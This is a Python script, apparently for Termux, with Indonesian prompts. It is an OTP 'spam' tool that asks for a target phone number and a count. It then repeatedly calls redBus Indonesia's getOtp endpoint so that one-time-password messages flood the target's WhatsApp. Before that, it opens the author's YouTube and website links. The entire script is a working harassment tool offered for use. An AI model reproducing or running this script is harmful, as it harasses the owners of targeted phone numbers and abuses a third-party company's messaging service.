import requests, os, sys, json, time
from time import sleep

def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)

os.system('clear')
print ('\033[36;1mSubscribe yt ku ngab \033[37mDMS \033[36mok! :v')
os.system('termux-open-url https://youtube.com/channel/UCKue93qD9mySc3RrtwxMRmQ')
sleep(5)
os.system('clear')
print ('\033[36;1mFollow \033[37;1mig gua ngab :v')
os.system('xdg-open https://dimasts21.my.id')
sleep(3)
os.system('clear')
# Ubah Terserah kalian
banner= """

\033[31;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[36;1m██║     ██║ █████╗
\033[31;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[36;1m██║ ██  ██║██╔══██╗
\033[31;1m ███████╗██████╔╝███████║██╔████╔██║ \033[36;1m██║████╔██║███████║
\033[31;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[36;1m████  ████║██╔══██║
\033[31;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[36;1m███║   ███║██║  ██║
\033[31;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[36;1m ╚═╝    ╚═╝╚═╝  ╚═╝

\033[33;1m╔════════════════════════════════════════════════╗
\033[33;1m║  \033[36;1m [•] Authour : Dimas Ts                      \033[33;1m ║
\033[33;1m║  \033[36;1m [•] gitHub  : https:github.com/Dimasts      \033[33;1m ║
\033[33;1m║  \033[36;1m [•] Recode  : Dimas Ts                      \033[33;1m ║
\033[33;1m╚════════════════════════════════════════════════╝
\033[36;1m╔═══════════════════════════╗
\033[36;1m║\033[33;1m GUNAKAN DENGAB BJIAK NGAB\033[36;1m ║
\033[36;1m╚═══════════════════════════╝"""
sleep(1)
print(banner)
# Jaggan di ubah sayang
print ("")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
no = input('\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ')
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]═════════════>")
jm = int(input('\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m '))
mengetik("[KALO SUDAH LIMIT TUNGGU BEBERAPA MENIT LAGI BARU ULANGI NGAB :V] ")
time.sleep(3)

head = {
'Host': 'm.redbus.id',
'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'accept': '*/*',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://m.redbus.id/user/editprofile',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
}
for i in range(jm):
      Ap = requests.get('https://m.redbus.id/api/getOtp?number='+no+'&cc=62&whatsAppOpted=true&disableOtpFlow=undefined',headers=head).text
      Ap1 = json.loads(Ap)['Message']
      if 'OTP Sent Successfully' in Ap1:
            print('\n \033[37;1m╚═>  \033[32;1mSpam Berhasil')
      else:
            print('\n \033[37;1m╚═>  \033[31;1mSpam Gagal')
